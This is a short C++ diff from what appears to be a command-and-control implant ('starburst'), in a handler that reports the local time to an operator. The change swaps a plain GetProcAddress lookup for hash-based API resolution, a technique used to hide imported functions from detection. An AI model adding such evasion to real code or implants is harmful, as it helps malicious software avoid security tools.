@@ -24,8 +24,8 @@ auto declfn starburst::cmd_localtime(
     auto k32 = inst.kernel32.handle;
 
     auto pGetLocalTime = reinterpret_cast<fn_GetLocalTime>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32,
-            symbol<LPCSTR>( "GetLocalTime" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( (HMODULE)k32 ),
+            expr::hash_string( "GetLocalTime" ) ) );
 
     if ( !pGetLocalTime ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
